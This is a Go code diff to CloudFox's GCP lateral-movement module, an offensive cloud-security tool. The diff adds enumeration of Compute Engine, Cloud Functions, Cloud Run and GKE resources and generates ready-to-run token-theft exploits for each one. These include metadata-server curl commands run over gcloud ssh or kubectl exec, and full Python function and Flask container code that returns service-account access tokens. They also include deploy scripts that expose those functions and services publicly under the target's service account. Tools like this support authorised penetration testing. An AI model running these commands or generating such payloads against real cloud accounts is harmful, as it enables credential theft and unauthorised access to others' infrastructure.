@@ -6,6 +6,10 @@ import (
 	"strings"
 	"sync"
 
+	CloudRunService "github.com/BishopFox/cloudfox/gcp/services/cloudrunService"
+	ComputeEngineService "github.com/BishopFox/cloudfox/gcp/services/computeEngineService"
+	FunctionsService "github.com/BishopFox/cloudfox/gcp/services/functionsService"
+	GKEService "github.com/BishopFox/cloudfox/gcp/services/gkeService"
 	IAMService "github.com/BishopFox/cloudfox/gcp/services/iamService"
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
@@ -59,24 +63,6 @@ type TokenTheftVector struct {
 	ExploitCommand string
 }
 
-type CrossProjectPath struct {
-	SourceProject string
-	TargetProject string
-	Principal     string
-	Role          string
-	AccessType    string // "direct", "impersonation", "shared_vpc"
-	RiskLevel     string
-}
-
-type CredentialLocation struct {
-	ResourceType string
-	ResourceName string
-	ProjectID    string
-	CredentialType string // "sa_key", "api_key", "secret", "env_var"
-	Description  string
-	RiskLevel    string
-}
-
 // ------------------------------
 // Module Struct
 // ------------------------------
@@ -85,8 +71,6 @@ type LateralMovementModule struct {
 
 	ImpersonationChains []ImpersonationChain
 	TokenTheftVectors   []TokenTheftVector
-	CrossProjectPaths   []CrossProjectPath
-	CredentialLocations []CredentialLocation
 	LootMap             map[string]*internal.LootFile
 	mu                  sync.Mutex
 }
@@ -115,8 +99,6 @@ func runGCPLateralMovementCommand(cmd *cobra.Command, args []string) {
 		BaseGCPModule:       gcpinternal.NewBaseGCPModule(cmdCtx),
 		ImpersonationChains: []ImpersonationChain{},
 		TokenTheftVectors:   []TokenTheftVector{},
-		CrossProjectPaths:   []CrossProjectPath{},
-		CredentialLocations: []CredentialLocation{},
 		LootMap:             make(map[string]*internal.LootFile),
 	}
 
@@ -134,14 +116,14 @@ func (m *LateralMovementModule) Execute(ctx context.Context, logger internal.Log
 	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_LATERALMOVEMENT_MODULE_NAME, m.processProject)
 
 	// Check results
-	totalPaths := len(m.ImpersonationChains) + len(m.TokenTheftVectors) + len(m.CrossProjectPaths)
+	totalPaths := len(m.ImpersonationChains) + len(m.TokenTheftVectors)
 	if totalPaths == 0 {
 		logger.InfoM("No lateral movement paths found", GCP_LATERALMOVEMENT_MODULE_NAME)
 		return
 	}
 
-	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s): %d impersonation chains, %d token theft vectors, %d cross-project paths",
-		totalPaths, len(m.ImpersonationChains), len(m.TokenTheftVectors), len(m.CrossProjectPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
+	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s): %d impersonation chains, %d token theft vectors",
+		totalPaths, len(m.ImpersonationChains), len(m.TokenTheftVectors)), GCP_LATERALMOVEMENT_MODULE_NAME)
 
 	m.writeOutput(ctx, logger)
 }
@@ -159,12 +141,6 @@ func (m *LateralMovementModule) processProject(ctx context.Context, projectID st
 
 	// 2. Find token theft vectors (compute instances, functions, etc.)
 	m.findTokenTheftVectors(ctx, projectID, logger)
-
-	// 3. Find cross-project access
-	m.findCrossProjectAccess(ctx, projectID, logger)
-
-	// 4. Find credential storage locations
-	m.findCredentialLocations(ctx, projectID, logger)
 }
 
 // findImpersonationChains finds service account impersonation paths
@@ -239,237 +215,395 @@ func (m *LateralMovementModule) findImpersonationChains(ctx context.Context, pro
 
 // findTokenTheftVectors finds compute resources where tokens can be stolen
 func (m *LateralMovementModule) findTokenTheftVectors(ctx context.Context, projectID string, logger internal.Logger) {
-	// This would use Compute Engine API to find instances with service accounts
-	// For now, we'll add the pattern for common token theft vectors
+	// Find Compute Engine instances with service accounts
+	m.findComputeInstanceVectors(ctx, projectID, logger)
 
-	// Common token theft vectors in GCP:
-	vectors := []TokenTheftVector{
-		{
-			ResourceType:   "compute_instance",
-			ResourceName:   "*",
-			ProjectID:      projectID,
-			ServiceAccount: "<instance-sa>",
-			AttackVector:   "metadata_server",
-			RiskLevel:      "HIGH",
-			ExploitCommand: `curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`,
-		},
-		{
-			ResourceType:   "cloud_function",
-			ResourceName:   "*",
-			ProjectID:      projectID,
-			ServiceAccount: "<function-sa>",
-			AttackVector:   "function_execution",
-			RiskLevel:      "HIGH",
-			ExploitCommand: `# Deploy a function that exfiltrates the SA token via metadata server`,
-		},
-		{
-			ResourceType:   "cloud_run",
-			ResourceName:   "*",
-			ProjectID:      projectID,
-			ServiceAccount: "<cloudrun-sa>",
-			AttackVector:   "container_execution",
-			RiskLevel:      "HIGH",
-			ExploitCommand: `# Access metadata server from within Cloud Run container`,
-		},
-		{
-			ResourceType:   "gke_pod",
-			ResourceName:   "*",
-			ProjectID:      projectID,
-			ServiceAccount: "<workload-identity-sa>",
-			AttackVector:   "pod_service_account",
-			RiskLevel:      "MEDIUM",
-			ExploitCommand: `kubectl exec -it <pod> -- curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/..."`,
-		},
-	}
+	// Find Cloud Functions with service accounts
+	m.findCloudFunctionVectors(ctx, projectID, logger)
 
-	m.mu.Lock()
-	m.TokenTheftVectors = append(m.TokenTheftVectors, vectors...)
-	for _, v := range vectors {
-		m.addTokenTheftVectorToLoot(v)
-	}
-	m.mu.Unlock()
+	// Find Cloud Run services with service accounts
+	m.findCloudRunVectors(ctx, projectID, logger)
+
+	// Find GKE clusters with node service accounts
+	m.findGKEVectors(ctx, projectID, logger)
 }
 
-// findCrossProjectAccess finds IAM bindings that allow cross-project access
-func (m *LateralMovementModule) findCrossProjectAccess(ctx context.Context, projectID string, logger internal.Logger) {
-	iamService := IAMService.New()
+// findComputeInstanceVectors finds compute instances where tokens can be stolen via metadata server
+func (m *LateralMovementModule) findComputeInstanceVectors(ctx context.Context, projectID string, logger internal.Logger) {
+	computeService := ComputeEngineService.New()
 
-	// Get IAM policy for the project using PoliciesWithInheritance for comprehensive view
-	bindings, err := iamService.PoliciesWithInheritance(projectID)
+	instances, err := computeService.Instances(projectID)
 	if err != nil {
-		m.CommandCounter.Error++
-		gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
-			fmt.Sprintf("Could not get IAM policy for project %s", projectID))
+		// Don't count as error - API may not be enabled
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
+				fmt.Sprintf("Could not get compute instances in project %s", projectID))
+		}
 		return
 	}
 
-	// Check each binding for cross-project principals
-	for _, binding := range bindings {
-		for _, member := range binding.Members {
-			// Check if member is from a different project
-			if strings.Contains(member, "serviceAccount:") && !strings.Contains(member, projectID) {
-				// Extract the SA's project from the email
-				saEmail := strings.TrimPrefix(member, "serviceAccount:")
-				saParts := strings.Split(saEmail, "@")
-				if len(saParts) >= 2 {
-					saProject := strings.TrimSuffix(saParts[1], ".iam.gserviceaccount.com")
+	for _, instance := range instances {
+		// Skip instances without service accounts
+		if len(instance.ServiceAccounts) == 0 {
+			continue
+		}
 
-					crossPath := CrossProjectPath{
-						SourceProject: saProject,
-						TargetProject: projectID,
-						Principal:     saEmail,
-						Role:          binding.Role,
-						AccessType:    "direct",
-						RiskLevel:     m.classifyCrossProjectRisk(binding.Role),
-					}
-
-					m.mu.Lock()
-					m.CrossProjectPaths = append(m.CrossProjectPaths, crossPath)
-					m.addCrossProjectPathToLoot(crossPath)
-					m.mu.Unlock()
-				}
+		for _, sa := range instance.ServiceAccounts {
+			// Skip default compute SA if it has no useful scopes
+			if sa.Email == "" {
+				continue
 			}
+
+			vector := TokenTheftVector{
+				ResourceType:   "compute_instance",
+				ResourceName:   instance.Name,
+				ProjectID:      projectID,
+				ServiceAccount: sa.Email,
+				AttackVector:   "metadata_server",
+				RiskLevel:      "HIGH",
+				ExploitCommand: fmt.Sprintf(`# SSH into instance and steal token
+gcloud compute ssh %s --zone=%s --project=%s --command='curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"'`,
+					instance.Name, instance.Zone, projectID),
+			}
+
+			m.mu.Lock()
+			m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
+			m.addTokenTheftVectorToLoot(vector)
+			m.mu.Unlock()
 		}
 	}
 }
 
-// findCredentialLocations identifies where credentials might be stored
-func (m *LateralMovementModule) findCredentialLocations(ctx context.Context, projectID string, logger internal.Logger) {
-	// Common credential storage locations in GCP
-	locations := []CredentialLocation{
-		{
-			ResourceType:   "secret_manager",
-			ResourceName:   "*",
+// findCloudFunctionVectors finds Cloud Functions where tokens can be stolen
+func (m *LateralMovementModule) findCloudFunctionVectors(ctx context.Context, projectID string, logger internal.Logger) {
+	functionsService := FunctionsService.New()
+
+	functions, err := functionsService.Functions(projectID)
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
+				fmt.Sprintf("Could not get Cloud Functions in project %s", projectID))
+		}
+		return
+	}
+
+	for _, fn := range functions {
+		if fn.ServiceAccount == "" {
+			continue
+		}
+
+		// Generate exploit with PoC code, deploy command, and invoke command
+		exploitCmd := fmt.Sprintf(`# Target: Cloud Function %s
+# Service Account: %s
+# Region: %s
+
+# Step 1: Create token exfiltration function code
+mkdir -p /tmp/token-theft-%s && cd /tmp/token-theft-%s
+
+cat > main.py << 'PYEOF'
+import functions_framework
+import requests
+
+@functions_framework.http
+def steal_token(request):
+    # Fetch SA token from metadata server
+    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    headers = {"Metadata-Flavor": "Google"}
+    resp = requests.get(token_url, headers=headers)
+    token_data = resp.json()
+
+    # Fetch SA email
+    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+    email_resp = requests.get(email_url, headers=headers)
+
+    return {
+        "service_account": email_resp.text,
+        "access_token": token_data.get("access_token"),
+        "token_type": token_data.get("token_type"),
+        "expires_in": token_data.get("expires_in")
+    }
+PYEOF
+
+cat > requirements.txt << 'REQEOF'
+functions-framework==3.*
+requests==2.*
+REQEOF
+
+# Step 2: Deploy function with target SA (requires cloudfunctions.functions.create + iam.serviceAccounts.actAs)
+gcloud functions deploy token-theft-poc \
+    --gen2 \
+    --runtime=python311 \
+    --region=%s \
+    --source=. \
+    --entry-point=steal_token \
+    --trigger-http \
+    --allow-unauthenticated \
+    --service-account=%s \
+    --project=%s
+
+# Step 3: Invoke function to get token
+curl -s $(gcloud functions describe token-theft-poc --region=%s --project=%s --format='value(url)')
+
+# Cleanup
+gcloud functions delete token-theft-poc --region=%s --project=%s --quiet`,
+			fn.Name, fn.ServiceAccount, fn.Region,
+			fn.Name, fn.Name,
+			fn.Region, fn.ServiceAccount, projectID,
+			fn.Region, projectID,
+			fn.Region, projectID)
+
+		vector := TokenTheftVector{
+			ResourceType:   "cloud_function",
+			ResourceName:   fn.Name,
 			ProjectID:      projectID,
-			CredentialType: "secret",
-			Description:    "Secrets stored in Secret Manager",
-			RiskLevel:      "MEDIUM",
-		},
-		{
-			ResourceType:   "compute_metadata",
-			ResourceName:   "*",
-			ProjectID:      projectID,
-			CredentialType: "env_var",
-			Description:    "Environment variables in instance metadata",
+			ServiceAccount: fn.ServiceAccount,
+			AttackVector:   "function_execution",
 			RiskLevel:      "HIGH",
-		},
-		{
-			ResourceType:   "gcs_bucket",
-			ResourceName:   "*",
-			ProjectID:      projectID,
-			CredentialType: "sa_key",
-			Description:    "Service account keys stored in GCS",
-			RiskLevel:      "CRITICAL",
-		},
-	}
+			ExploitCommand: exploitCmd,
+		}
 
-	m.mu.Lock()
-	m.CredentialLocations = append(m.CredentialLocations, locations...)
-	m.mu.Unlock()
+		m.mu.Lock()
+		m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
+		m.addTokenTheftVectorToLoot(vector)
+		m.mu.Unlock()
+	}
 }
 
-// classifyCrossProjectRisk determines the risk level of a cross-project binding
-func (m *LateralMovementModule) classifyCrossProjectRisk(role string) string {
-	highRiskRoles := []string{
-		"roles/owner",
-		"roles/editor",
-		"roles/iam.securityAdmin",
-		"roles/iam.serviceAccountAdmin",
-		"roles/iam.serviceAccountTokenCreator",
-		"roles/iam.serviceAccountKeyAdmin",
+// findCloudRunVectors finds Cloud Run services where tokens can be stolen
+func (m *LateralMovementModule) findCloudRunVectors(ctx context.Context, projectID string, logger internal.Logger) {
+	cloudRunService := CloudRunService.New()
+
+	services, err := cloudRunService.Services(projectID)
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
+				fmt.Sprintf("Could not get Cloud Run services in project %s", projectID))
+		}
+		return
 	}
 
-	for _, hr := range highRiskRoles {
-		if role == hr {
-			return "CRITICAL"
+	for _, svc := range services {
+		if svc.ServiceAccount == "" {
+			continue
+		}
+
+		// Generate exploit with PoC code, deploy command, and invoke command
+		exploitCmd := fmt.Sprintf(`# Target: Cloud Run Service %s
+# Service Account: %s
+# Region: %s
+
+# Step 1: Create token exfiltration container
+mkdir -p /tmp/cloudrun-theft-%s && cd /tmp/cloudrun-theft-%s
+
+cat > main.py << 'PYEOF'
+from flask import Flask, jsonify
+import requests
+import os
+
+app = Flask(__name__)
+
+@app.route("/")
+def steal_token():
+    # Fetch SA token from metadata server
+    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    headers = {"Metadata-Flavor": "Google"}
+    resp = requests.get(token_url, headers=headers)
+    token_data = resp.json()
+
+    # Fetch SA email
+    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+    email_resp = requests.get(email_url, headers=headers)
+
+    return jsonify({
+        "service_account": email_resp.text,
+        "access_token": token_data.get("access_token"),
+        "token_type": token_data.get("token_type"),
+        "expires_in": token_data.get("expires_in")
+    })
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+PYEOF
+
+cat > requirements.txt << 'REQEOF'
+flask==3.*
+requests==2.*
+gunicorn==21.*
+REQEOF
+
+cat > Dockerfile << 'DOCKEOF'
+FROM python:3.11-slim
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+COPY main.py .
+CMD exec gunicorn --bind :$PORT --workers 1 --threads 8 --timeout 0 main:app
+DOCKEOF
+
+# Step 2: Build and push container
+gcloud builds submit --tag gcr.io/%s/token-theft-poc --project=%s
+
+# Step 3: Deploy Cloud Run service with target SA (requires run.services.create + iam.serviceAccounts.actAs)
+gcloud run deploy token-theft-poc \
+    --image gcr.io/%s/token-theft-poc \
+    --region=%s \
+    --service-account=%s \
+    --allow-unauthenticated \
+    --project=%s
+
+# Step 4: Invoke service to get token
+curl -s $(gcloud run services describe token-theft-poc --region=%s --project=%s --format='value(status.url)')
+
+# Cleanup
+gcloud run services delete token-theft-poc --region=%s --project=%s --quiet
+gcloud container images delete gcr.io/%s/token-theft-poc --quiet --force-delete-tags`,
+			svc.Name, svc.ServiceAccount, svc.Region,
+			svc.Name, svc.Name,
+			projectID, projectID,
+			projectID, svc.Region, svc.ServiceAccount, projectID,
+			svc.Region, projectID,
+			svc.Region, projectID,
+			projectID)
+
+		vector := TokenTheftVector{
+			ResourceType:   "cloud_run",
+			ResourceName:   svc.Name,
+			ProjectID:      projectID,
+			ServiceAccount: svc.ServiceAccount,
+			AttackVector:   "container_execution",
+			RiskLevel:      "HIGH",
+			ExploitCommand: exploitCmd,
+		}
+
+		m.mu.Lock()
+		m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
+		m.addTokenTheftVectorToLoot(vector)
+		m.mu.Unlock()
+	}
+}
+
+// findGKEVectors finds GKE clusters/node pools where tokens can be stolen
+func (m *LateralMovementModule) findGKEVectors(ctx context.Context, projectID string, logger internal.Logger) {
+	gkeService := GKEService.New()
+
+	clusters, nodePools, err := gkeService.Clusters(projectID)
+	if err != nil {
+		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
+			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
+				fmt.Sprintf("Could not get GKE clusters in project %s", projectID))
+		}
+		return
+	}
+
+	// Track cluster SAs to avoid duplicates in node pools
+	clusterSAs := make(map[string]string) // clusterName -> SA
+
+	for _, cluster := range clusters {
+		// Check node service account
+		if cluster.NodeServiceAccount != "" {
+			clusterSAs[cluster.Name] = cluster.NodeServiceAccount
+
+			var exploitCmd string
+			if cluster.WorkloadIdentity != "" {
+				exploitCmd = fmt.Sprintf(`# Cluster uses Workload Identity - tokens are pod-specific
+# Get credentials for cluster:
+gcloud container clusters get-credentials %s --location=%s --project=%s
+# Then exec into a pod and check for mounted SA token:
+kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token`,
+					cluster.Name, cluster.Location, projectID)
+			} else {
+				exploitCmd = fmt.Sprintf(`# Cluster uses node SA (no Workload Identity) - all pods can access node SA
+gcloud container clusters get-credentials %s --location=%s --project=%s
+# Exec into any pod and steal node SA token:
+kubectl exec -it <pod> -- curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`,
+					cluster.Name, cluster.Location, projectID)
+			}
+
+			vector := TokenTheftVector{
+				ResourceType:   "gke_cluster",
+				ResourceName:   cluster.Name,
+				ProjectID:      projectID,
+				ServiceAccount: cluster.NodeServiceAccount,
+				AttackVector:   "pod_service_account",
+				RiskLevel:      "HIGH",
+				ExploitCommand: exploitCmd,
+			}
+
+			m.mu.Lock()
+			m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
+			m.addTokenTheftVectorToLoot(vector)
+			m.mu.Unlock()
 		}
 	}
 
-	if strings.Contains(role, "admin") || strings.Contains(role, "Admin") {
-		return "HIGH"
-	}
+	// Process node pools with different SAs than their cluster
+	for _, np := range nodePools {
+		clusterSA := clusterSAs[np.ClusterName]
+		if np.ServiceAccount == "" || np.ServiceAccount == clusterSA {
+			continue // Skip if same as cluster SA or empty
+		}
 
-	return "MEDIUM"
+		exploitCmd := fmt.Sprintf(`# Node pool %s uses specific SA
+gcloud container clusters get-credentials %s --location=%s --project=%s
+# Exec into pod running on this node pool and steal token`,
+			np.Name, np.ClusterName, np.Location, projectID)
+
+		vector := TokenTheftVector{
+			ResourceType:   "gke_nodepool",
+			ResourceName:   fmt.Sprintf("%s/%s", np.ClusterName, np.Name),
+			ProjectID:      projectID,
+			ServiceAccount: np.ServiceAccount,
+			AttackVector:   "pod_service_account",
+			RiskLevel:      "HIGH",
+			ExploitCommand: exploitCmd,
+		}
+
+		m.mu.Lock()
+		m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
+		m.addTokenTheftVectorToLoot(vector)
+		m.mu.Unlock()
+	}
 }
 
 // ------------------------------
 // Loot File Management
 // ------------------------------
 func (m *LateralMovementModule) initializeLootFiles() {
-	m.LootMap["lateral-impersonation-chains"] = &internal.LootFile{
-		Name:     "lateral-impersonation-chains",
-		Contents: "# Service Account Impersonation Chains\n# Generated by CloudFox\n# These show how one identity can assume another\n\n",
+	m.LootMap["impersonation-chains-commands"] = &internal.LootFile{
+		Name:     "impersonation-chains-commands",
+		Contents: "# Impersonation Chain Exploit Commands\n# Generated by CloudFox\n\n",
 	}
-	m.LootMap["lateral-token-theft"] = &internal.LootFile{
-		Name:     "lateral-token-theft",
-		Contents: "# Token Theft Vectors\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
-	}
-	m.LootMap["lateral-cross-project"] = &internal.LootFile{
-		Name:     "lateral-cross-project",
-		Contents: "# Cross-Project Access Paths\n# Generated by CloudFox\n# These show lateral movement opportunities between projects\n\n",
-	}
-	m.LootMap["lateral-exploitation"] = &internal.LootFile{
-		Name:     "lateral-exploitation",
-		Contents: "# Lateral Movement Exploitation Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
+	m.LootMap["token-theft-commands"] = &internal.LootFile{
+		Name:     "token-theft-commands",
+		Contents: "# Token Theft Exploit Commands\n# Generated by CloudFox\n\n",
 	}
 }
 
 func (m *LateralMovementModule) addImpersonationChainToLoot(chain ImpersonationChain, projectID string) {
-	m.LootMap["lateral-impersonation-chains"].Contents += fmt.Sprintf(
-		"## Chain: %s -> %s\n"+
-			"Risk: %s\n"+
-			"Path: %s\n"+
-			"Command: %s\n\n",
+	m.LootMap["impersonation-chains-commands"].Contents += fmt.Sprintf(
+		"# Impersonation: %s -> %s\n"+
+			"# Path: %s\n"+
+			"%s\n\n",
 		chain.StartIdentity,
 		chain.TargetSA,
-		chain.RiskLevel,
 		strings.Join(chain.Path, " -> "),
 		chain.ExploitCommand,
 	)
-
-	if chain.RiskLevel == "CRITICAL" || chain.RiskLevel == "HIGH" {
-		m.LootMap["lateral-exploitation"].Contents += fmt.Sprintf(
-			"# Impersonation: %s -> %s (%s)\n"+
-				"%s\n\n",
-			chain.StartIdentity,
-			chain.TargetSA,
-			chain.RiskLevel,
-			chain.ExploitCommand,
-		)
-	}
 }
 
 func (m *LateralMovementModule) addTokenTheftVectorToLoot(vector TokenTheftVector) {
-	m.LootMap["lateral-token-theft"].Contents += fmt.Sprintf(
-		"## %s: %s\n"+
-			"Project: %s\n"+
-			"Service Account: %s\n"+
-			"Attack Vector: %s\n"+
-			"Risk: %s\n"+
-			"Command:\n%s\n\n",
+	m.LootMap["token-theft-commands"].Contents += fmt.Sprintf(
+		"# Token Theft: %s (%s)\n"+
+			"# Project: %s\n"+
+			"# Service Account: %s\n"+
+			"# Attack Vector: %s\n"+
+			"%s\n\n",
 		vector.ResourceType,
 		vector.ResourceName,
 		vector.ProjectID,
 		vector.ServiceAccount,
 		vector.AttackVector,
-		vector.RiskLevel,
 		vector.ExploitCommand,
-	)
-}
-
-func (m *LateralMovementModule) addCrossProjectPathToLoot(path CrossProjectPath) {
-	m.LootMap["lateral-cross-project"].Contents += fmt.Sprintf(
-		"## %s -> %s\n"+
-			"Principal: %s\n"+
-			"Role: %s\n"+
-			"Access Type: %s\n"+
-			"Risk: %s\n\n",
-		path.SourceProject,
-		path.TargetProject,
-		path.Principal,
-		path.Role,
-		path.AccessType,
-		path.RiskLevel,
 	)
 }
 
@@ -478,68 +612,62 @@ func (m *LateralMovementModule) addCrossProjectPathToLoot(path CrossProjectPath)
 // ------------------------------
 func (m *LateralMovementModule) writeOutput(ctx context.Context, logger internal.Logger) {
 	// Impersonation chains table
+	// Reads: Source identity can perform action on target service account
 	chainsHeader := []string{
-		"Start Identity",
-		"Target SA",
-		"Chain Length",
-		"Risk",
-		"Exploit Command",
+		"Source Identity",
+		"Action",
+		"Target Service Account",
+		"Impersonation Path",
 	}
 
 	var chainsBody [][]string
 	for _, chain := range m.ImpersonationChains {
+		// Determine action based on exploit command
+		action := "impersonate (get token)"
+		if strings.Contains(chain.ExploitCommand, "keys create") {
+			action = "create key"
+		}
+
 		chainsBody = append(chainsBody, []string{
-			truncateString(chain.StartIdentity, 40),
-			truncateString(chain.TargetSA, 40),
-			fmt.Sprintf("%d", chain.ChainLength),
-			chain.RiskLevel,
-			truncateString(chain.ExploitCommand, 50),
+			chain.StartIdentity,
+			action,
+			chain.TargetSA,
+			strings.Join(chain.Path, " -> "),
 		})
 	}
 
 	// Token theft vectors table
 	vectorsHeader := []string{
-		"Resource Type",
-		"Resource",
 		"Project Name",
 		"Project ID",
-		"Attack Vector",
-		"Risk",
+		"Source Resource Type",
+		"Source Resource Name",
+		"Action",
+		"Target Service Account",
 	}
 
 	var vectorsBody [][]string
 	for _, vector := range m.TokenTheftVectors {
+		// Map attack vector to action description
+		action := vector.AttackVector
+		switch vector.AttackVector {
+		case "metadata_server":
+			action = "steal token (metadata)"
+		case "function_execution":
+			action = "steal token (function)"
+		case "container_execution":
+			action = "steal token (container)"
+		case "pod_service_account":
+			action = "steal token (pod)"
+		}
+
 		vectorsBody = append(vectorsBody, []string{
-			vector.ResourceType,
-			truncateString(vector.ResourceName, 30),
 			m.GetProjectName(vector.ProjectID),
 			vector.ProjectID,
-			vector.AttackVector,
-			vector.RiskLevel,
-		})
-	}
-
-	// Cross-project paths table
-	crossHeader := []string{
-		"Source Project Name",
-		"Source Project ID",
-		"Target Project Name",
-		"Target Project ID",
-		"Principal",
-		"Role",
-		"Risk",
-	}
-
-	var crossBody [][]string
-	for _, path := range m.CrossProjectPaths {
-		crossBody = append(crossBody, []string{
-			m.GetProjectName(path.SourceProject),
-			path.SourceProject,
-			m.GetProjectName(path.TargetProject),
-			path.TargetProject,
-			truncateString(path.Principal, 40),
-			path.Role,
-			path.RiskLevel,
+			vector.ResourceType,
+			vector.ResourceName,
+			action,
+			vector.ServiceAccount,
 		})
 	}
 
@@ -569,15 +697,6 @@ func (m *LateralMovementModule) writeOutput(ctx context.Context, logger internal
 			Header: vectorsHeader,
 			Body:   vectorsBody,
 		})
-	}
-
-	if len(crossBody) > 0 {
-		tables = append(tables, internal.TableFile{
-			Name:   "lateral-cross-project",
-			Header: crossHeader,
-			Body:   crossBody,
-		})
-		logger.InfoM(fmt.Sprintf("[PENTEST] Found %d cross-project path(s)", len(crossBody)), GCP_LATERALMOVEMENT_MODULE_NAME)
 	}
 
 	output := LateralMovementOutput{
